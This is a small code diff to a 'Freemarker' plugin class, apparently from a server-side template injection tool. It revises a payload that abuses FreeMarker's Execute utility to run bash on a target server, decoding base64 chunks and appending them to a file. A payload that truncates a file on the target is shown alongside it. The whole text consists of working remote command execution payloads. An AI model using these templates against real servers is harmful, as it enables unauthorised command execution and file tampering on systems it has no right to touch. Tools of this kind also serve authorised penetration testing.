@@ -15,7 +15,7 @@ class Freemarker(Plugin):
         },
         'write' : {
             'call' : 'inject',
-            'write' : """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {tr,/+,_-}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s") }""",
+            'write' : """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s") }""",
             'truncate' : """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {echo,-n,}>%(path)s") }""",
         },
         'read' : {
